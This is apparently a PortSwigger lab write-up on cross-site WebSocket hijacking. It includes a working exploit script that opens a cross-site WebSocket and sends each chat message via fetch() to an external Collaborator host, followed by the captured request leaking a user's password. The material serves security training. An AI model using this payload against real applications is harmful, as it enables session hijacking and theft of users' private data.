## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/550853ed-24d9-4326-b1c8-c0b87710211c)

## Overview :

Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

> NOTE - The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.

_An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server._

## Solution :

Clicking on **Live Chat**, loads the chat page.

The following is the websocket connection request -

```http
GET /chat HTTP/1.1
Host: 0a5a007204c9f57381fbe986006e0077.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 13
Origin: https://0a5a007204c9f57381fbe986006e0077.web-security-academy.net
Sec-WebSocket-Key: rHRYnTnQlSN0/MayNfD9gQ==
Connection: keep-alive, Upgrade
Cookie: session=tcnP10xowGofDir0BMeIf0fn8ll8JpEW
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: websocket
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
```
Note that it doesn't have any protection against CSRF attacks & the application sends the token in *session cookie* itself.

So an attacker can craft a malicious page that performs a CSRF attack & the session cookie will be added automaticaly when the user clicks on the link to the malicious webpage hosted by the attacker.

Go to the exploit server & paste the following script.

```js
<script>
    var ws = new WebSocket('wss://0a5a007204c9f57381fbe986006e0077.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://hf04fu8orrbtcrephnwuv82j9af13srh.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Store & deliver exploit to victim.

Now in our burp-colaborator, we can see some HTTP & DNS interactions.

One of the requests in the HTTP interaction has the password of the user

```http
POST / HTTP/1.1
Host: hf04fu8orrbtcrephnwuv82j9af13srh.oastify.com
Connection: keep-alive
Content-Length: 82
sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-platform: "Linux"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://exploit-0adc00a104d1f53381d2e86201320021.exploit-server.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://exploit-0adc00a104d1f53381d2e86201320021.exploit-server.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{
"user":"Hal Pline",
"content":"No problem carlos, it's e0efqkw9c60qhoi97guu"
}
```

Now login as carlos using the credentials `e0efqkw9c60qhoi97guu` to solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/342a85bf-f506-439c-939a-b04afe2db0af)
